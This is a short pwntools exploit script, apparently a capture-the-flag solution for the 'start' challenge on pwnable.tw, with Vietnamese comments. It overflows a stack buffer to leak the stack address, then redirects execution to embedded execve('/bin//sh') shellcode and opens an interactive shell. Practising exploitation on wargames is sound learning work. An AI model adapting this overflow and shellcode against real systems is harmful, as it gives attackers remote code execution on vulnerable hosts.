from pwn import * 
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

r = remote("chall.pwnable.tw",10000)
#r = process('./start')
payload = b'a'*20 + p32(0x08048087) #20 chữ a là để fill buffer, p32(0x08048087) để ghi đè return address về 0x08048087
r.sendafter(b':',payload)
leak = r.recv()[0:4] #
print(leak)
esp = u32(leak)
log.info('esp: '+hex(esp))
payload = b'a'*20 + p32(esp + 20) + shellcode
r.send(payload)
r.interactive()